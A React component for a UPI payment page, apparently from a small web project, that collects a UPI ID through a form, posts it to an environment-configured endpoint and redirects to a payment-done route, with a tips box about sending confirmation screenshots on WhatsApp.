

import { useState, useEffect, useRef } from 'react'

import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';

function Upipay() {


    const [count, setCount] = useState()
    const navigate = useNavigate();


    const handleclick = () => {
        navigate("/")
    }

    const {
        register,
        handleSubmit,
        watch,
        formState: { errors, isSubmitting },
    } = useForm();

    const delay = (d) => {
        return new Promise((resolve, reject) => {
            setTimeout(() => {
                resolve()
            }, d * 3000);
        })
    }

    //const onSubmit = async (data) => {
    // await delay(2)
    //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
    //let res = await r.text()
    //console.log(data, res)


    const onSubmit = async (data) => {
        navigate("/Upi-Payment-Done")
        let r = await fetch(import.meta.env.VITE_MONGO, {
            method: "POST", headers: {
                "Content-Type": "application/json",
            }, body: JSON.stringify(data)


        })
        let res = await r.text()

        console.log(data, res)


    }

    return (
        <>
            <div className="payment-body">




                <div className="pay-cont">
                    <div className="pay-header">
                        <div className="pay-heading">Upi Payment</div>
                        <img className="pay-img" src="./img/upi-logo3.jfif" alt="fail imgggggg" />
                    </div>
                    <div className="pay-form">
                        {isSubmitting && <div>Loading...</div>}
                        <form action="" onSubmit={handleSubmit(onSubmit)}>
                            <div className="card-num">
                                <label className='pay-label'  >Enter Your UPI ID</label>
                                <input type="text" placeholder="Paytm PhonePe GooglePay any other.." {...register("upi")} name='upi' className="pay-form-cont" />
                            </div>





                            <button class="adress-btn" type="submit" value="submit">Continue</button>

                        </form>
                    </div>


                </div>


                <div className="main-payment-box">

                    <div className="payment-option-box">
                        <div className="card-logo">
                            
                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#5f6368"><path d="M880-720v480q0 33-23.5 56.5T800-160H160q-33 0-56.5-23.5T80-240v-480q0-33 23.5-56.5T160-800h640q33 0 56.5 23.5T880-720Zm-720 80h640v-80H160v80Zm0 160v240h640v-240H160Zm0 240v-480 480Z"/></svg>

                            <h5 id='c-heading'>DEIT/CREDIT CARDS</h5>

                        </div>

                        <a id='pay' href="/Payment-section">Pay</a>
                    </div>

                </div>


                <div className="tips-box">
                    <div className="tips">Important Tips</div>

                    <div className="important-lins">* After registration compleate Send Payment done </div>
                    <div className="important-lins">* Confarmation Screenshot on Whatsapp</div>
                    <div className="important-lins">* Please ensure your Card is enabled for online transaction</div>
                    <div className="important-lins">* Please ensure to complete the payment transaction well within time limits</div>




                </div>

            </div>
        </>
    )
}

export default Upipay